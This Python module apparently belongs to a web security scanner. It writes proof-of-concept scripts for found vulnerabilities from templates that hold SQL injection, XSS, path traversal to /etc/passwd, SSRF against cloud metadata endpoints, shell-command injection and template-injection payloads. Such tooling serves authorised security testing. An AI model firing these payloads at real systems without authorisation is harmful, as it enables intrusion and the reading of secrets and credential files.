"""Auto Exploit Generator — generate PoC exploit scripts for found vulnerabilities."""

import os
import json
from datetime import datetime
from modules.core import console

EXPLOIT_TEMPLATES = {
    'sqli': {
        'name': 'SQL Injection PoC',
        'template': '''#!/usr/bin/env python3
"""SQL Injection PoC — Auto-generated by Snakebite"""
import requests

TARGET = "{url}"
PAYLOAD = "{payload}"

# Boolean-based blind SQLi test
def test_sqli():
    print(f"[*] Testing SQL Injection on {{TARGET}}")
    
    # True condition
    true_payload = PAYLOAD.replace("1=1", "1=1")
    r1 = requests.get(TARGET, params={{"id": true_payload}}, verify=False, timeout=10)
    
    # False condition
    false_payload = PAYLOAD.replace("1=1", "1=2")
    r2 = requests.get(TARGET, params={{"id": false_payload}}, verify=False, timeout=10)
    
    if len(r1.text) != len(r2.text):
        print(f"[+] VULNERABLE! Response diff: {{len(r1.text)}} vs {{len(r2.text)}}")
        return True
    else:
        print("[-] Not vulnerable or WAF blocking")
        return False

if __name__ == "__main__":
    test_sqli()
''',
    },
    'xss': {
        'name': 'XSS PoC',
        'template': '''#!/usr/bin/env python3
"""XSS PoC — Auto-generated by Snakebite"""
import requests
from urllib.parse import quote

TARGET = "{url}"
PAYLOAD = "{payload}"

def test_xss():
    print(f"[*] Testing Reflected XSS on {{TARGET}}")
    
    payloads = [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        "'-alert(1)-'",
    ]
    
    for p in payloads:
        r = requests.get(TARGET, params={{"q": p}}, verify=False, timeout=10)
        if p in r.text:
            print(f"[+] REFLECTED: {{p[:40]}}")
            print(f"[+] URL: {{r.url}}")
            return True
    
    print("[-] No reflection detected")
    return False

if __name__ == "__main__":
    test_xss()
''',
    },
    'lfi': {
        'name': 'LFI PoC',
        'template': '''#!/usr/bin/env python3
"""Local File Inclusion PoC — Auto-generated by Snakebite"""
import requests

TARGET = "{url}"

def test_lfi():
    print(f"[*] Testing LFI on {{TARGET}}")
    
    payloads = [
        ("../etc/passwd", "root:"),
        ("....//....//etc/passwd", "root:"),
        ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
        ("..\\\\..\\\\..\\\\windows\\\\win.ini", "[fonts]"),
    ]
    
    for path, indicator in payloads:
        r = requests.get(f"{{TARGET}}?file={{path}}", verify=False, timeout=10)
        if indicator in r.text:
            print(f"[+] LFI CONFIRMED: {{path}}")
            print(f"[+] Evidence: {{r.text[:200]}}")
            return True
    
    print("[-] LFI not confirmed")
    return False

if __name__ == "__main__":
    test_lfi()
''',
    },
    'ssrf': {
        'name': 'SSRF PoC',
        'template': '''#!/usr/bin/env python3
"""SSRF PoC — Auto-generated by Snakebite"""
import requests

TARGET = "{url}"

def test_ssrf():
    print(f"[*] Testing SSRF on {{TARGET}}")
    
    # AWS metadata
    ssrf_urls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ]
    
    for ssrf_url in ssrf_urls:
        r = requests.get(TARGET, params={{"url": ssrf_url}}, verify=False, timeout=10)
        if any(kw in r.text for kw in ["ami-id", "instance-id", "computeMetadata"]):
            print(f"[+] SSRF CONFIRMED: {{ssrf_url}}")
            return True
    
    print("[-] SSRF not confirmed")
    return False

if __name__ == "__main__":
    test_ssrf()
''',
    },
    'rce': {
        'name': 'RCE PoC',
        'template': '''#!/usr/bin/env python3
"""Remote Code Execution PoC — Auto-generated by Snakebite"""
import requests

TARGET = "{url}"

def test_rce():
    print(f"[*] Testing RCE on {{TARGET}}")
    print("[!] WARNING: This is a proof of concept only")
    
    # Time-based detection (safe)
    import time
    
    payloads = [
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
    ]
    
    for payload, expected_delay in payloads:
        start = time.time()
        try:
            r = requests.get(TARGET, params={{"cmd": payload}}, verify=False, timeout=15)
            elapsed = time.time() - start
            if elapsed >= expected_delay - 1:
                print(f"[+] RCE POSSIBLE: Response delayed {{elapsed:.1f}}s with: {{payload}}")
                return True
        except requests.Timeout:
            print(f"[+] RCE POSSIBLE: Request timed out with: {{payload}}")
            return True
    
    print("[-] RCE not confirmed via time-based")
    return False

if __name__ == "__main__":
    test_rce()
''',
    },
    'ssti': {
        'name': 'SSTI PoC',
        'template': '''#!/usr/bin/env python3
"""Server-Side Template Injection PoC — Auto-generated by Snakebite"""
import requests

TARGET = "{url}"

def test_ssti():
    print(f"[*] Testing SSTI on {{TARGET}}")
    
    payloads = [
        ("{{{{7*7}}}}", "49"),
        ("${{7*7}}", "49"),
        ("<%= 7*7 %>", "49"),
        ("{{{{config}}}}", "SECRET_KEY"),
        ("#{{7*7}}", "49"),
    ]
    
    for payload, expected in payloads:
        r = requests.get(TARGET, params={{"name": payload}}, verify=False, timeout=10)
        if expected in r.text:
            print(f"[+] SSTI CONFIRMED: {{payload}} => {{expected}}")
            return True
    
    print("[-] SSTI not detected")
    return False

if __name__ == "__main__":
    test_ssti()
''',
    },
}


def generate_exploit(finding, output_dir='exploits'):
    """Generate a PoC exploit script for a finding."""
    vuln_type = finding.get('type', finding.get('vulnerability', '')).lower()
    vuln_url = finding.get('url', '')
    payload = finding.get('payload', finding.get('evidence', ''))

    template_key = None
    for key in EXPLOIT_TEMPLATES:
        if key in vuln_type:
            template_key = key
            break

    if not template_key:
        return None

    template = EXPLOIT_TEMPLATES[template_key]
    script = template['template'].format(url=vuln_url, payload=payload or 'test')

    os.makedirs(output_dir, exist_ok=True)
    filename = f"poc_{template_key}_{len(os.listdir(output_dir)) + 1}.py"
    filepath = os.path.join(output_dir, filename)

    with open(filepath, 'w') as f:
        f.write(script)

    return {'file': filepath, 'type': template_key, 'name': template['name']}


def generate_all_exploits(findings, output_dir='exploits'):
    """Generate PoC exploits for all applicable findings."""
    console.print(f"\n[bold cyan]--- Auto Exploit Generator ---[/bold cyan]")

    if not findings:
        console.print(f"  [dim]No findings to generate exploits for[/dim]")
        return []

    generated = []
    seen_types = set()

    for finding in findings:
        vuln_type = finding.get('type', finding.get('vulnerability', '')).lower()
        type_key = None
        for key in EXPLOIT_TEMPLATES:
            if key in vuln_type:
                type_key = key
                break

        if type_key and type_key not in seen_types:
            result = generate_exploit(finding, output_dir)
            if result:
                generated.append(result)
                seen_types.add(type_key)
                console.print(f"  [green]✓ {result['name']} → {result['file']}[/green]")

    if generated:
        console.print(f"\n  [bold green]{len(generated)} PoC scripts generated in {output_dir}/[/bold green]")
    else:
        console.print(f"  [dim]No matching exploit templates for findings[/dim]")

    return generated
